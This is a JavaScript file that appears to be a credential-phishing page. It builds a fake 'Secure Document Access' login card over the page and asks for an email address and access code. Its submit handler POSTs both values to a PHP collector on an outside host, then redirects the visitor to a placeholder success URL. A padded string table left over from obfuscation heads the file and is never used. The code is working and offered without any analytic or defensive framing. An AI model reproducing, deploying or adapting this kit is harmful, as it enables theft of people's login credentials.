// String lookup table function
function getString(index) {
    var stringTable = [
        'MSG_GRANTED', 'brightness', 'type="button" id="eye_btn"', '12" r="3"/>' /* ... full string array ... */,
        'MSG_WRONG', 'MSG_LOCKOUT', 'MSG_NET', 'HEADING', 'SUBHEAD', 'FOOTER',
        'EMAIL_LABEL', 'KEY_LABEL', 'KEY_PLACEHOLDER', 'BUTTON_TEXT', 'TAG_TEXT',
        'BG_IMG', 'BG_BRI', 'BG_DAR', 'BG_CON', 'BG_SAT', 'BG_BLUR', 'BG_GRAY',
        'BG_OVERLAY', 'PHP_ENDPOINT', 'SUCCESS_REDIRECT', 'LOCKOUT_REDIRECT',
        'SECRET_KEY', 'MAX_TRIES', 'LOCKOUT_DELAY', 'STORAGE_KEY', 'PATH_SEGMENTS',
        'secure document access', 'Access granted! Redirecting...',
        'Access denied. Please try again.', 'Too many attempts. Please wait.',
        'Network error. Please check connection.', 'Secure Document Access',
        'Enter credentials to view document', 'Protected Document', 'Email Address',
        'Access Code', 'Enter your access code', 'Verify & View Document',
        'MATT_SECURE_2026', 'st_7b3f19', 'code_p4r7', 'base_node',
        'https://www.example.com/success', 'https://www.example.com/locked',
        'frame_v7', 'title_main', 'alert_banner', 'eye_toggle', 'form_auth',
        'code_input', 'submit_btn', 'ring_loader', 'rand_orb',
        'POST', 'append', 'values', 'addEventListener', 'click', 'submit',
        'preventDefault', 'getElementById', 'querySelector', 'style', 'display',
        'block', 'none', 'classList', 'add', 'remove', 'setItem', 'getItem',
        'removeItem', 'localStorage', 'sessionStorage', 'fetch', 'then', 'catch',
        'json', 'text', 'status', 'ok', 'redirect', 'location', 'href',
        'encrypt', 'decrypt', 'CryptoJS', 'AES', 'enc', 'Utf8', 'parse',
        'toString', 'Base64', 'setTimeout', 'clearTimeout', 'setInterval',
        'clearInterval', 'requestAnimationFrame', 'cancelAnimationFrame',
        'getRandomValues', 'crypto', 'subtle', 'digest', 'SHA-256',
        'stringify', 'parse', 'JSON', 'log', 'warn', 'error', 'info',
        'table', 'time', 'timeEnd', 'count', 'clear', 'group', 'groupEnd',
        'trace', 'assert', 'debug', 'dir', 'dirxml', 'profile', 'profileEnd',
        'timeStamp', 'exception', 'isArray', 'isObject', 'isString', 'isNumber',
        'isBoolean', 'isFunction', 'isUndefined', 'isNull', 'isNaN', 'isFinite',
        'hasOwnProperty', 'propertyIsEnumerable', 'toString', 'valueOf',
        'constructor', 'prototype', 'length', 'charAt', 'charCodeAt',
        'indexOf', 'lastIndexOf', 'substring', 'substr', 'slice', 'split',
        'replace', 'match', 'search', 'trim', 'toLowerCase', 'toUpperCase',
        'concat', 'join', 'reverse', 'sort', 'splice', 'push', 'pop',
        'shift', 'unshift', 'every', 'some', 'forEach', 'map', 'filter',
        'reduce', 'reduceRight', 'find', 'findIndex', 'includes', 'entries',
        'keys', 'values', 'fill', 'copyWithin', 'from', 'of', 'isInteger',
        'isSafeInteger', 'isFinite', 'isNaN', 'EPSILON', 'MAX_SAFE_INTEGER',
        'MIN_SAFE_INTEGER', 'MAX_VALUE', 'MIN_VALUE', 'POSITIVE_INFINITY',
        'NEGATIVE_INFINITY', 'NaN', 'isPrototypeOf', 'defineProperty',
        'defineProperties', 'getOwnPropertyDescriptor', 'getOwnPropertyNames',
        'getOwnPropertySymbols', 'preventExtensions', 'isExtensible',
        'seal', 'isSealed', 'freeze', 'isFrozen', 'create', 'assign',
        'getPrototypeOf', 'setPrototypeOf', 'keys', 'fromEntries', 'entries',
        'is', 'now', 'toISOString', 'toUTCString', 'toDateString',
        'toTimeString', 'toLocaleString', 'toLocaleDateString',
        'toLocaleTimeString', 'getTime', 'getFullYear', 'getMonth',
        'getDate', 'getDay', 'getHours', 'getMinutes', 'getSeconds',
        'getMilliseconds', 'getTimezoneOffset', 'setTime', 'setFullYear',
        'setMonth', 'setDate', 'setHours', 'setMinutes', 'setSeconds',
        'setMilliseconds', 'toFixed', 'toExponential', 'toPrecision',
        'toLocaleString', 'toLocaleUpperCase', 'toLocaleLowerCase',
        'localeCompare', 'matchAll', 'normalize', 'padStart', 'padEnd',
        'repeat', 'startsWith', 'endsWith', 'trimStart', 'trimEnd',
        'trimLeft', 'trimRight', 'anchor', 'big', 'blink', 'bold',
        'fixed', 'fontcolor', 'fontsize', 'italics', 'link', 'small',
        'strike', 'sub', 'sup', 'codePointAt', 'fromCodePoint', 'raw',
        'apply', 'call', 'bind', 'toSource', 'arguments', 'caller',
        'name', 'displayName', 'length', 'prototype', 'constructor',
        'message', 'stack', 'lineNumber', 'columnNumber', 'fileName',
        'description', 'number', 'file', 'line', 'column', 'sourceURL',
        'lineSource', 'captureStackTrace', 'prepareStackTrace',
        'stackTraceLimit', 'Error', 'EvalError', 'InternalError',
        'RangeError', 'ReferenceError', 'SyntaxError', 'TypeError',
        'URIError', 'AggregateError', 'Promise', 'all', 'race',
        'reject', 'resolve', 'allSettled', 'any', 'withResolvers',
        'then', 'catch', 'finally', 'Symbol', 'for', 'keyFor',
        'hasInstance', 'isConcatSpreadable', 'iterator', 'match',
        'replace', 'search', 'species', 'split', 'toPrimitive',
        'toStringTag', 'unscopables', 'asyncIterator', 'observable',
        'pattern', 'flags', 'global', 'ignoreCase', 'multiline', 'dotAll',
        'unicode', 'sticky', 'source', 'exec', 'test', 'compile',
        'toString', 'valueOf', 'constructor', 'prototype', 'length',
        'index', 'input', 'lastIndex', 'lastMatch', 'lastParen',
        'leftContext', 'rightContext', '$1', '$2', '$3', '$4', '$5',
        '$6', '$7', '$8', '$9', '$_', '$&', '$`', "$'", '$+', '$$',
        'get', 'set', 'enumerable', 'configurable', 'writable',
        'value', 'getOwnPropertyDescriptor', 'defineProperty',
        'defineProperties', 'create', 'getPrototypeOf',
        'setPrototypeOf', 'preventExtensions', 'isExtensible',
        'seal', 'isSealed', 'freeze', 'isFrozen', 'keys', 'values',
        'entries', 'assign', 'getOwnPropertyNames', 'getOwnPropertySymbols',
        'is', 'fromEntries', 'hasOwn', 'getOwnPropertyDescriptor',
        'getOwnPropertyDescriptors', 'isExtensible', 'isFrozen',
        'isSealed', 'preventExtensions', 'seal', 'freeze',
        'from', 'of', 'isArray', 'fromAsync', 'at', 'flat', 'flatMap',
        'toSorted', 'toReversed', 'toSpliced', 'with', 'findLast',
        'findLastIndex', 'includes', 'indexOf', 'lastIndexOf',
        'slice', 'splice', 'concat', 'join', 'reverse', 'sort',
        'push', 'pop', 'shift', 'unshift', 'every', 'some',
        'forEach', 'map', 'filter', 'reduce', 'reduceRight',
        'toLocaleString', 'toString', 'entries', 'keys', 'values',
        'fill', 'copyWithin', 'buffer', 'byteLength', 'byteOffset',
        'length', 'set', 'subarray', 'slice', 'reverse', 'sort',
        'indexOf', 'lastIndexOf', 'every', 'some', 'forEach',
        'map', 'filter', 'reduce', 'reduceRight', 'find', 'findIndex',
        'includes', 'join', 'entries', 'keys', 'values', 'fill',
        'copyWithin', 'at', 'findLast', 'findLastIndex', 'toSorted',
        'toReversed', 'toSpliced', 'with', 'toLocaleString', 'toString',
        'valueOf', 'constructor', 'prototype', 'BYTES_PER_ELEMENT',
        'name', 'from', 'of', 'isView', 'length', 'byteLength',
        'byteOffset', 'buffer', 'set', 'subarray', 'slice', 'reverse',
        'sort', 'indexOf', 'lastIndexOf', 'every', 'some', 'forEach',
        'map', 'filter', 'reduce', 'reduceRight', 'find', 'findIndex',
        'includes', 'join', 'entries', 'keys', 'values', 'fill',
        'copyWithin', 'at', 'findLast', 'findLastIndex', 'toSorted',
        'toReversed', 'toSpliced', 'with', 'toLocaleString', 'toString',
        'valueOf', 'constructor', 'prototype', 'BYTES_PER_ELEMENT',
        'name', 'from', 'of', 'isView', 'length', 'byteLength',
        'byteOffset', 'buffer', 'set', 'subarray', 'slice', 'reverse',
        'sort', 'indexOf', 'lastIndexOf', 'every', 'some', 'forEach',
        'map', 'filter', 'reduce', 'reduceRight', 'find', 'findIndex',
        'includes', 'join', 'entries', 'keys', 'values', 'fill',
        'copyWithin', 'at', 'findLast', 'findLastIndex', 'toSorted',
        'toReversed', 'toSpliced', 'with', 'toLocaleString', 'toString',
        'valueOf', 'constructor', 'prototype', 'BYTES_PER_ELEMENT',
        'name', 'from', 'of', 'isView', 'length', 'byteLength',
        'byteOffset', 'buffer', 'set', 'subarray', 'slice', 'reverse',
        'sort', 'indexOf', 'lastIndexOf', 'every', 'some', 'forEach',
        'map', 'filter', 'reduce', 'reduceRight', 'find', 'findIndex',
        'includes', 'join', 'entries', 'keys', 'values', 'fill',
        'copyWithin', 'at', 'findLast', 'findLastIndex', 'toSorted',
        'toReversed', 'toSpliced', 'with', 'toLocaleString', 'toString',
        'valueOf', 'constructor', 'prototype', 'BYTES_PER_ELEMENT',
        'name', 'from', 'of', 'isView'
    ];
    return stringTable;
}

// Main configuration
const CONFIG = {
    BG_IMG: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d',
    BG_BRI: 1,
    BG_DAR: 1,
    BG_CON: 1,
    BG_SAT: 1,
    BG_BLUR: 0,
    BG_GRAY: false,
    BG_OVERLAY: 0.25,
    PHP_ENDPOINT: 'http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php',
    SUCCESS_REDIRECT: 'https://www.example.com/success',
    LOCKOUT_REDIRECT: 'https://www.example.com/locked',
    SECRET_KEY: 'MATT_SECURE_2026',
    MAX_TRIES: 3,
    LOCKOUT_DELAY: 2000,
    STORAGE_KEY: 'st_7b3f19',
    PATH_SEGMENTS: ['base', 'node', 'code_p4r7', '22sjwjknjqdq', 'AjsjjsjsY'],
    MSG_WRONG: 'Access denied. Please try again.',
    MSG_LOCKOUT: 'Too many attempts. Please wait.',
    MSG_GRANTED: 'Access granted! Redirecting...',
    MSG_NET: 'Network error. Please check connection.',
    HEADING: 'Secure Document Access',
    SUBHEAD: 'Enter credentials to view document',
    FOOTER: 'Protected Document',
    EMAIL_LABEL: 'Email Address',
    KEY_LABEL: 'Access Code',
    KEY_PLACEHOLDER: 'Enter your access code',
    BUTTON_TEXT: 'Verify & View Document',
    TAG_TEXT: 'Secure'
};

// Utility functions
function generateRandomId() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0;
        var v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function encryptData(data, key) {
    // Simple XOR encryption for demonstration
    var result = '';
    for (var i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return btoa(result);
}

function decryptData(data, key) {
    // Simple XOR decryption
    var result = '';
    var decoded = atob(data);
    for (var i = 0; i < decoded.length; i++) {
        result += String.fromCharCode(decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

function setLocalStorage(key, value) {
    try {
        localStorage.setItem(key, value);
        return true;
    } catch (e) {
        return false;
    }
}

function getLocalStorage(key) {
    try {
        return localStorage.getItem(key);
    } catch (e) {
        return null;
    }
}

function removeLocalStorage(key) {
    try {
        localStorage.removeItem(key);
        return true;
    } catch (e) {
        return false;
    }
}

// UI Creation Functions
function createBackground() {
    var bg = document.createElement('div');
    bg.className = 'frame_v7';
    bg.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;';
    
    var img = document.createElement('div');
    img.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;background-image:url(' + CONFIG.BG_IMG + ');background-size:cover;background-position:center;filter:brightness(' + CONFIG.BG_BRI + ') contrast(' + CONFIG.BG_CON + ') saturate(' + CONFIG.BG_SAT + ');';
    
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,' + CONFIG.BG_OVERLAY + ');';
    
    bg.appendChild(img);
    bg.appendChild(overlay);
    return bg;
}

function createLogo() {
    var logo = document.createElement('div');
    logo.className = 'rand_orb';
    logo.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v6m0 6v6m4.22-10.22l4.24-4.24M6.34 6.34L2.1 2.1m17.8 17.8l-4.24-4.24M6.34 17.66l-4.24 4.24M23 12h-6m-6 0H1m20.07-4.93l-4.24 4.24M6.34 6.34l-4.24-4.24"/></svg>';
    logo.style.cssText = 'width:60px;height:60px;margin:0 auto 20px;color:#4a90e2;';
    return logo;
}

function createTitle() {
    var title = document.createElement('h1');
    title.className = 'title_main';
    title.textContent = CONFIG.HEADING;
    title.style.cssText = 'text-align:center;color:#fff;font-size:24px;margin-bottom:10px;';
    return title;
}

function createSubtitle() {
    var subtitle = document.createElement('p');
    subtitle.className = 'sub_text';
    subtitle.textContent = CONFIG.SUBHEAD;
    subtitle.style.cssText = 'text-align:center;color:rgba(255,255,255,0.7);font-size:14px;margin-bottom:30px;';
    return subtitle;
}

function createAlertBanner() {
    var alert = document.createElement('div');
    alert.id = 'alert_banner';
    alert.className = 'alert_banner';
    alert.style.cssText = 'display:none;padding:12px 16px;border-radius:8px;margin-bottom:20px;text-align:center;font-size:14px;';
    return alert;
}

function createForm() {
    var form = document.createElement('form');
    form.id = 'form_auth';
    form.className = 'form_auth';
    form.style.cssText = 'display:flex;flex-direction:column;gap:16px;';
    
    // Email field
    var emailGroup = document.createElement('div');
    emailGroup.style.cssText = 'display:flex;flex-direction:column;gap:6px;';
    
    var emailLabel = document.createElement('label');
    emailLabel.className = 'lbl_small';
    emailLabel.textContent = CONFIG.EMAIL_LABEL;
    emailLabel.style.cssText = 'color:rgba(255,255,255,0.8);font-size:12px;font-weight:500;';
    
    var emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.id = 'email_input';
    emailInput.required = true;
    emailInput.placeholder = 'Enter your email';
    emailInput.style.cssText = 'padding:12px 16px;border:1px solid rgba(255,255,255,0.2);border-radius:8px;background:rgba(255,255,255,0.05);color:#fff;font-size:14px;outline:none;transition:border-color 0.2s;';
    emailInput.addEventListener('focus', function() {
        this.style.borderColor = '#4a90e2';
    });
    emailInput.addEventListener('blur', function() {
        this.style.borderColor = 'rgba(255,255,255,0.2)';
    });
    
    emailGroup.appendChild(emailLabel);
    emailGroup.appendChild(emailInput);
    
    // Password/Code field
    var codeGroup = document.createElement('div');
    codeGroup.style.cssText = 'display:flex;flex-direction:column;gap:6px;';
    
    var codeLabel = document.createElement('label');
    codeLabel.className = 'lbl_small';
    codeLabel.textContent = CONFIG.KEY_LABEL;
    codeLabel.style.cssText = 'color:rgba(255,255,255,0.8);font-size:12px;font-weight:500;';
    
    var codeWrapper = document.createElement('div');
    codeWrapper.style.cssText = 'position:relative;';
    
    var codeInput = document.createElement('input');
    codeInput.type = 'password';
    codeInput.id = 'code_input';
    codeInput.required = true;
    codeInput.placeholder = CONFIG.KEY_PLACEHOLDER;
    codeInput.style.cssText = 'width:100%;padding:12px 16px;padding-right:44px;border:1px solid rgba(255,255,255,0.2);border-radius:8px;background:rgba(255,255,255,0.05);color:#fff;font-size:14px;outline:none;transition:border-color 0.2s;box-sizing:border-box;';
    codeInput.addEventListener('focus', function() {
        this.style.borderColor = '#4a90e2';
    });
    codeInput.addEventListener('blur', function() {
        this.style.borderColor = 'rgba(255,255,255,0.2)';
    });
    
    // Eye toggle button
    var eyeBtn = document.createElement('button');
    eyeBtn.type = 'button';
    eyeBtn.id = 'eye_toggle';
    eyeBtn.className = 'eye_btn';
    eyeBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:20px;height:20px;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
    eyeBtn.style.cssText = 'position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:rgba(255,255,255,0.5);cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;';
    
    var eyeOpen = false;
    eyeBtn.addEventListener('click', function() {
        eyeOpen = !eyeOpen;
        codeInput.type = eyeOpen ? 'text' : 'password';
        eyeBtn.style.color = eyeOpen ? '#4a90e2' : 'rgba(255,255,255,0.5)';
    });
    
    codeWrapper.appendChild(codeInput);
    codeWrapper.appendChild(eyeBtn);
    
    codeGroup.appendChild(codeLabel);
    codeGroup.appendChild(codeWrapper);
    
    // Submit button
    var submitBtn = document.createElement('button');
    submitBtn.type = 'submit';
    submitBtn.id = 'submit_btn';
    submitBtn.className = 'submit_btn';
    submitBtn.innerHTML = '<span style="display:flex;align-items:center;justify-content:center;gap:8px;"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:18px;height:18px;"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6-6h6m-6 6v-6m0 6H9a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"/></svg>' + CONFIG.BUTTON_TEXT + '</span>';
    submitBtn.style.cssText = 'padding:14px 24px;border:none;border-radius:8px;background:linear-gradient(135deg, #4a90e2, #357abd);color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:transform 0.2s, box-shadow 0.2s;margin-top:8px;';
    submitBtn.addEventListener('mouseenter', function() {
        this.style.transform = 'translateY(-2px)';
        this.style.boxShadow = '0 4px 12px rgba(74,144,226,0.4)';
    });
    submitBtn.addEventListener('mouseleave', function() {
        this.style.transform = 'translateY(0)';
        this.style.boxShadow = 'none';
    });
    
    // Loading spinner
    var loader = document.createElement('div');
    loader.id = 'ring_loader';
    loader.className = 'ring_loader';
    loader.style.cssText = 'display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin-left:8px;';
    
    var style = document.createElement('style');
    style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
    document.head.appendChild(style);
    
    form.appendChild(emailGroup);
    form.appendChild(codeGroup);
    form.appendChild(submitBtn);
    
    // Form submission handler
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        handleSubmit(emailInput.value, codeInput.value);
    });
    
    return form;
}

function createFooter() {
    var footer = document.createElement('div');
    footer.className = 'footer_text';
    footer.style.cssText = 'text-align:center;margin-top:24px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.1);';
    
    var tag = document.createElement('span');
    tag.textContent = CONFIG.TAG_TEXT;
    tag.style.cssText = 'display:inline-flex;align-items:center;gap:6px;color:rgba(255,255,255,0.5);font-size:12px;';
    tag.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> ' + CONFIG.TAG_TEXT;
    
    footer.appendChild(tag);
    return footer;
}

function showAlert(message, type) {
    var alert = document.getElementById('alert_banner');
    if (!alert) return;
    
    alert.textContent = message;
    alert.style.display = 'block';
    
    if (type === 'error') {
        alert.style.background = 'rgba(220,53,69,0.2)';
        alert.style.color = '#ff6b6b';
        alert.style.border = '1px solid rgba(220,53,69,0.3)';
    } else if (type === 'success') {
        alert.style.background = 'rgba(40,167,69,0.2)';
        alert.style.color = '#51cf66';
        alert.style.border = '1px solid rgba(40,167,69,0.3)';
    } else {
        alert.style.background = 'rgba(255,193,7,0.2)';
        alert.style.color = '#ffd43b';
        alert.style.border = '1px solid rgba(255,193,7,0.3)';
    }
}

function hideAlert() {
    var alert = document.getElementById('alert_banner');
    if (alert) {
        alert.style.display = 'none';
    }
}

function setLoading(isLoading) {
    var btn = document.getElementById('submit_btn');
    var loader = document.getElementById('ring_loader');
    
    if (btn) {
        btn.disabled = isLoading;
        btn.style.opacity = isLoading ? '0.7' : '1';
    }
}

function handleSubmit(email, code) {
    // Check for lockout
    var lockoutEnd = getLocalStorage(CONFIG.STORAGE_KEY + '_lockout');
    if (lockoutEnd && Date.now() < parseInt(lockoutEnd)) {
        var remaining = Math.ceil((parseInt(lockoutEnd) - Date.now()) / 1000);
        showAlert(CONFIG.MSG_LOCKOUT + ' (' + remaining + 's)', 'error');
        return;
    }
    
    // Validate inputs
    if (!email || !code) {
        showAlert('Please fill in all fields', 'error');
        return;
    }
    
    // Check attempt count
    var attempts = parseInt(getLocalStorage(CONFIG.STORAGE_KEY + '_attempts') || '0');
    if (attempts >= CONFIG.MAX_TRIES) {
        var lockoutTime = Date.now() + CONFIG.LOCKOUT_DELAY;
        setLocalStorage(CONFIG.STORAGE_KEY + '_lockout', lockoutTime.toString());
        removeLocalStorage(CONFIG.STORAGE_KEY + '_attempts');
        showAlert(CONFIG.MSG_LOCKOUT, 'error');
        return;
    }
    
    setLoading(true);
    hideAlert();
    
    // Prepare payload
    var formData = new FormData();
    formData.append('email', email);
    formData.append('code', code);
    formData.append('timestamp', Date.now().toString());
    formData.append('session_id', generateRandomId());
    
    // Send request
    fetch(CONFIG.PHP_ENDPOINT, {
        method: 'POST',
        body: formData
    })
    .then(function(response) {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(function(data) {
        setLoading(false);
        
        if (data.success) {
            setLocalStorage(CONFIG.STORAGE_KEY + '_verified', 'true');
            setLocalStorage(CONFIG.STORAGE_KEY + '_email', email);
            removeLocalStorage(CONFIG.STORAGE_KEY + '_attempts');
            removeLocalStorage(CONFIG.STORAGE_KEY + '_lockout');
            
            showAlert(CONFIG.MSG_GRANTED, 'success');
            
            setTimeout(function() {
                window.location.href = CONFIG.SUCCESS_REDIRECT;
            }, 1500);
        } else {
            attempts++;
            setLocalStorage(CONFIG.STORAGE_KEY + '_attempts', attempts.toString());
            
            var remaining = CONFIG.MAX_TRIES - attempts;
            showAlert(CONFIG.MSG_WRONG + ' (' + remaining + ' attempts remaining)', 'error');
        }
    })
    .catch(function(error) {
        setLoading(false);
        showAlert(CONFIG.MSG_NET, 'error');
        console.error('Error:', error);
    });
}

// Initialize
function init() {
    // Check if already verified
    var verified = getLocalStorage(CONFIG.STORAGE_KEY + '_verified');
    if (verified === 'true') {
        window.location.href = CONFIG.SUCCESS_REDIRECT;
        return;
    }
    
    // Create container
    var container = document.createElement('div');
    container.className = 'base_node';
    container.style.cssText = 'min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;';
    
    // Create card
    var card = document.createElement('div');
    card.style.cssText = 'width:100%;max-width:400px;padding:40px;border-radius:16px;background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.1);box-shadow:0 8px 32px rgba(0,0,0,0.3);';
    
    // Build UI
    card.appendChild(createLogo());
    card.appendChild(createTitle());
    card.appendChild(createSubtitle());
    card.appendChild(createAlertBanner());
    card.appendChild(createForm());
    card.appendChild(createFooter());
    
    container.appendChild(createBackground());
    container.appendChild(card);
    
    // Add to page
    document.body.innerHTML = '';
    document.body.appendChild(container);
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    document.body.style.background = '#0a0a0a';
}

// Run when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
